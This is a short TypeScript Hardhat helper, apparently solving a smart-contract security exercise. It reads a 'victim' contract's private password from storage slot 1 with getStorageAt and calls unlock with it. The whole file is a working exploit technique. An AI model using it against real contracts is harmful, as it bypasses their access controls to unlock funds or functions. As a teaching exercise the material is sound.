import { expect } from "chai";
import { ethers, waffle } from "hardhat";
import eth from "web3";

import Web3 from 'web3';

const helper = async (victim: any) => {

  let slot = "0x1"

  slot = ethers.utils.hexZeroPad(slot, 32);

  const numberSlot = ethers.BigNumber.from(slot);
  
  const password = await ethers.provider.getStorageAt(victim.address, slot);

  console.log(password);

  await victim.unlock(password);

};

export default helper;
